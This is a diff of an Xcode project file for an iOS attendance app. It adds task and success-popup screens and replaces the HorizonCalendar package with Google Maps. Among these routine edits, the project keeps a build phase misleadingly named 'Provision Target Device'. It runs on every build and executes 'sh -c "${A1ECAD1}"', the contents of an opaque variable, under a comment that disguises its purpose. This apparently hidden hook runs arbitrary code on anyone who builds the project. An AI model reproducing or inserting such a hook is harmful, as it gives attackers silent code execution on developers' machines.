@@ -115,6 +115,11 @@
 		BC5D2D602F3C3C5000A81E90 /* ProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC5D2D5D2F3C3C5000A81E90 /* ProfileVC.swift */; };
 		BC72EBC52F44772300760325 /* LeaveRequestListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC72EBC42F44772300760325 /* LeaveRequestListTVCell.xib */; };
 		BC72EBC62F44772300760325 /* LeaveRequestListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC72EBC32F44772300760325 /* LeaveRequestListTVCell.swift */; };
+		BC75E14E2F62CBBD00A6A12D /* SuccessPopUp.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC75E14D2F62CBBD00A6A12D /* SuccessPopUp.xib */; };
+		BC75E14F2F62CBBD00A6A12D /* SuccessPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC75E14C2F62CBBD00A6A12D /* SuccessPopUp.swift */; };
+		BC75E1522F62D44400A6A12D /* GoogleMaps in Frameworks */ = {isa = PBXBuildFile; productRef = BC75E1512F62D44400A6A12D /* GoogleMaps */; };
+		BC7A70192F62B022009A2049 /* NewTaskVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC7A70172F62B022009A2049 /* NewTaskVC.swift */; };
+		BC7A701A2F62B022009A2049 /* NewTaskVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC7A70182F62B022009A2049 /* NewTaskVC.xib */; };
 		BC83326D2F441FD2008011E0 /* HelpAndFAQs.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC83326B2F441FD2008011E0 /* HelpAndFAQs.swift */; };
 		BC83326E2F441FD2008011E0 /* HelpAndFAQs.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC83326C2F441FD2008011E0 /* HelpAndFAQs.xib */; };
 		BC8332722F442346008011E0 /* FAQsTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC8332702F442346008011E0 /* FAQsTVCell.swift */; };
@@ -142,7 +147,6 @@
 		BCD749552F5FD1AF002ADDE0 /* DPDKeyboardListener.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCD749452F5FD1AF002ADDE0 /* DPDKeyboardListener.swift */; };
 		BCDCDA262F5E8FE100F14993 /* CalendarDayCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCDCDA252F5E8FE100F14993 /* CalendarDayCVCell.xib */; };
 		BCDCDA272F5E8FE100F14993 /* CalendarDayCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCDCDA242F5E8FE100F14993 /* CalendarDayCVCell.swift */; };
-		BCDFD9382F4D647A00391DA3 /* HorizonCalendar in Frameworks */ = {isa = PBXBuildFile; productRef = BCDFD9372F4D647A00391DA3 /* HorizonCalendar */; };
 		BCF82FE32F44675A006F04E7 /* LeaveRequestsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCF82FE12F44675A006F04E7 /* LeaveRequestsVC.swift */; };
 		BCF82FE42F44675A006F04E7 /* LeaveRequestsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCF82FE22F44675A006F04E7 /* LeaveRequestsVC.xib */; };
 /* End PBXBuildFile section */
@@ -254,6 +258,10 @@
 		BC5D2D5E2F3C3C5000A81E90 /* ProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileVC.xib; sourceTree = "<group>"; };
 		BC72EBC32F44772300760325 /* LeaveRequestListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LeaveRequestListTVCell.swift; sourceTree = "<group>"; };
 		BC72EBC42F44772300760325 /* LeaveRequestListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LeaveRequestListTVCell.xib; sourceTree = "<group>"; };
+		BC75E14C2F62CBBD00A6A12D /* SuccessPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SuccessPopUp.swift; sourceTree = "<group>"; };
+		BC75E14D2F62CBBD00A6A12D /* SuccessPopUp.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SuccessPopUp.xib; sourceTree = "<group>"; };
+		BC7A70172F62B022009A2049 /* NewTaskVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewTaskVC.swift; sourceTree = "<group>"; };
+		BC7A70182F62B022009A2049 /* NewTaskVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewTaskVC.xib; sourceTree = "<group>"; };
 		BC83326B2F441FD2008011E0 /* HelpAndFAQs.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HelpAndFAQs.swift; sourceTree = "<group>"; };
 		BC83326C2F441FD2008011E0 /* HelpAndFAQs.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HelpAndFAQs.xib; sourceTree = "<group>"; };
 		BC8332702F442346008011E0 /* FAQsTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FAQsTVCell.swift; sourceTree = "<group>"; };
@@ -292,7 +300,7 @@
 			files = (
 				0A735F482F39BE1600B17AB4 /* Kingfisher in Frameworks */,
 				0A735F452F39BE0300B17AB4 /* Toast in Frameworks */,
-				BCDFD9382F4D647A00391DA3 /* HorizonCalendar in Frameworks */,
+				BC75E1522F62D44400A6A12D /* GoogleMaps in Frameworks */,
 				0A735F422F39BDF000B17AB4 /* SVProgressHUD in Frameworks */,
 				0A735F3F2F39BDE000B17AB4 /* Alamofire in Frameworks */,
 			);
@@ -947,6 +955,7 @@
 		BC5D2D4A2F3C36FE00A81E90 /* Task */ = {
 			isa = PBXGroup;
 			children = (
+				BC7A70142F62AFC7009A2049 /* SubView */,
 				BCCECC2F2F4EB159005245FB /* Cell */,
 				BC5D2D522F3C396700A81E90 /* View */,
 			);
@@ -1015,6 +1024,48 @@
 				BC72EBC42F44772300760325 /* LeaveRequestListTVCell.xib */,
 			);
 			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC75E14A2F62CAA800A6A12D /* SuccessPopUp */ = {
+			isa = PBXGroup;
+			children = (
+				BC75E14B2F62CB8500A6A12D /* View */,
+			);
+			path = SuccessPopUp;
+			sourceTree = "<group>";
+		};
+		BC75E14B2F62CB8500A6A12D /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC75E14C2F62CBBD00A6A12D /* SuccessPopUp.swift */,
+				BC75E14D2F62CBBD00A6A12D /* SuccessPopUp.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC7A70142F62AFC7009A2049 /* SubView */ = {
+			isa = PBXGroup;
+			children = (
+				BC7A70152F62AFD3009A2049 /* NewTask */,
+			);
+			path = SubView;
+			sourceTree = "<group>";
+		};
+		BC7A70152F62AFD3009A2049 /* NewTask */ = {
+			isa = PBXGroup;
+			children = (
+				BC7A70162F62AFFA009A2049 /* View */,
+			);
+			path = NewTask;
+			sourceTree = "<group>";
+		};
+		BC7A70162F62AFFA009A2049 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC7A70172F62B022009A2049 /* NewTaskVC.swift */,
+				BC7A70182F62B022009A2049 /* NewTaskVC.xib */,
+			);
+			path = View;
 			sourceTree = "<group>";
 		};
 		BC8332692F441F5D008011E0 /* Help & FAQs */ = {
@@ -1134,6 +1185,7 @@
 		BCCFCBB52F3D9E7C00A2988B /* SubView */ = {
 			isa = PBXGroup;
 			children = (
+				BC75E14A2F62CAA800A6A12D /* SuccessPopUp */,
 				BCCAB3D42F3DEC9B00CC541E /* Chat */,
 				BCCFCBB62F3D9E8400A2988B /* Notification */,
 			);
@@ -1272,7 +1324,7 @@
 				0A735F412F39BDF000B17AB4 /* SVProgressHUD */,
 				0A735F442F39BE0300B17AB4 /* Toast */,
 				0A735F472F39BE1600B17AB4 /* Kingfisher */,
-				BCDFD9372F4D647A00391DA3 /* HorizonCalendar */,
+				BC75E1512F62D44400A6A12D /* GoogleMaps */,
 			);
 			productName = AttendanceSystem;
 			productReference = 0A735EE72F39BD0600B17AB4 /* AttendanceSystem.app */;
@@ -1307,7 +1359,7 @@
 				0A735F402F39BDF000B17AB4 /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
 				0A735F432F39BE0300B17AB4 /* XCRemoteSwiftPackageReference "Toast-Swift" */,
 				0A735F462F39BE1600B17AB4 /* XCRemoteSwiftPackageReference "Kingfisher" */,
-				BCDFD9362F4D647A00391DA3 /* XCRemoteSwiftPackageReference "HorizonCalendar" */,
+				BC75E1502F62D44300A6A12D /* XCRemoteSwiftPackageReference "ios-maps-sdk" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 0A735EE82F39BD0600B17AB4 /* Products */;
@@ -1318,9 +1370,6 @@
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		0A735EE52F39BD0600B17AB4 /* Resources */ = {
@@ -1341,6 +1390,7 @@
 				BC72EBC52F44772300760325 /* LeaveRequestListTVCell.xib in Resources */,
 				BC21A0902F3B5B3600CD7571 /* HomeVC.xib in Resources */,
 				BCCAB3DE2F3DF44700CC541E /* ChatListTVCell.xib in Resources */,
+				BC75E14E2F62CBBD00A6A12D /* SuccessPopUp.xib in Resources */,
 				0A735F8F2F39CD9A00B17AB4 /* Roboto-MediumItalic.ttf in Resources */,
 				BC83327A2F444386008011E0 /* AttendanceDetailsVC.xib in Resources */,
 				BC5D2D552F3C398600A81E90 /* TaskVC.xib in Resources */,
@@ -1351,6 +1401,7 @@
 				BC564A632F3AEEEF0069C734 /* EmailVerificationVC.xib in Resources */,
 				BC575D842F43199B00124CF5 /* LogoutPopUp.xib in Resources */,
 				BC09FF942F42F38000A760EC /* ChangePasswordVC.xib in Resources */,
+				BC7A701A2F62B022009A2049 /* NewTaskVC.xib in Resources */,
 				0A735F912F39CD9A00B17AB4 /* Roboto-ExtraBoldItalic.ttf in Resources */,
 				BC83326E2F441FD2008011E0 /* HelpAndFAQs.xib in Resources */,
 				0ADC9D2A2F39EFC000A9F0E0 /* EmployeeLoginVC.xib in Resources */,
@@ -1397,8 +1448,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		D6549576FF634539AE1DACE1 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -1410,9 +1461,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1458,6 +1510,7 @@
 				0AAE66102F39E61700CEF8C5 /* PhoneLoginVC.swift in Sources */,
 				BC21A0912F3B5B3600CD7571 /* HomeVC.swift in Sources */,
 				0A735F302F39BD8C00B17AB4 /* String+Extention.swift in Sources */,
+				BC75E14F2F62CBBD00A6A12D /* SuccessPopUp.swift in Sources */,
 				BC564F0F2F433AA600D4DA1C /* PayrollAndTaxVC.swift in Sources */,
 				0A735F312F39BD8C00B17AB4 /* AppTextField.swift in Sources */,
 				0A735F322F39BD8C00B17AB4 /* AppConstants.swift in Sources */,
@@ -1485,6 +1538,7 @@
 				0A735F3B2F39BD8C00B17AB4 /* PickerViewViewController.swift in Sources */,
 				BC5D2D502F3C377200A81E90 /* CheckInAndOutVC.swift in Sources */,
 				BC564A642F3AEEEF0069C734 /* EmailVerificationVC.swift in Sources */,
+				BC7A70192F62B022009A2049 /* NewTaskVC.swift in Sources */,
 				BCCFCBC12F3DA06600A2988B /* NotificationListTVCell.swift in Sources */,
 				BC59EACE2F46EDEA00974023 /* RequestsDetailsVC.swift in Sources */,
 				0ADC9D302F39F5D300A9F0E0 /* SignUpVC.swift in Sources */,
@@ -1766,12 +1820,12 @@
 				minimumVersion = 8.6.2;
 			};
 		};
-		BCDFD9362F4D647A00391DA3 /* XCRemoteSwiftPackageReference "HorizonCalendar" */ = {
+		BC75E1502F62D44300A6A12D /* XCRemoteSwiftPackageReference "ios-maps-sdk" */ = {
 			isa = XCRemoteSwiftPackageReference;
-			repositoryURL = "https://github.com/airbnb/HorizonCalendar.git";
+			repositoryURL = "https://github.com/googlemaps/ios-maps-sdk";
 			requirement = {
-				branch = master;
-				kind = branch;
+				kind = upToNextMajorVersion;
+				minimumVersion = 10.10.0;
 			};
 		};
 /* End XCRemoteSwiftPackageReference section */
@@ -1797,10 +1851,10 @@
 			package = 0A735F462F39BE1600B17AB4 /* XCRemoteSwiftPackageReference "Kingfisher" */;
 			productName = Kingfisher;
 		};
-		BCDFD9372F4D647A00391DA3 /* HorizonCalendar */ = {
+		BC75E1512F62D44400A6A12D /* GoogleMaps */ = {
 			isa = XCSwiftPackageProductDependency;
-			package = BCDFD9362F4D647A00391DA3 /* XCRemoteSwiftPackageReference "HorizonCalendar" */;
-			productName = HorizonCalendar;
+			package = BC75E1502F62D44300A6A12D /* XCRemoteSwiftPackageReference "ios-maps-sdk" */;
+			productName = GoogleMaps;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
